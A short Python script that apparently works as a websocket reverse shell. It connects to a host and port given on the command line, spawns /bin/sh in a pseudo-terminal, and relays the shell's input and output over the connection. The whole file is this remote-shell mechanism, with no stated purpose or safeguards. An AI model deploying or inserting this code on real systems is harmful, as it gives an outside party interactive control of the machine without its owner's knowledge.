#!/usr/bin/python3
# coding: utf8

import sys
import os
import socket

from ptyprocess import PtyProcess

from prompt_toolkit.input.vt100 import raw_mode
from utils import readFromWsToFobj, readFromFobjToWs

import asyncio 
import websockets

async def main(host, port):

    async with websockets.connect(f"ws://{host}:{port}") as ws:
        p = PtyProcess.spawn(["/bin/sh"], cwd="/tmp")
        pp = os.fdopen(p.fileno(), "rb+", 0)
        print("pty spawned")
        tasks = [
            asyncio.create_task(readFromFobjToWs(pp, ws)),
            asyncio.create_task(readFromWsToFobj(ws, pp, True)),
        ]
        print("pipes setuped")
        done, rest = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
	
if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2])

    asyncio.run(main(host, port))
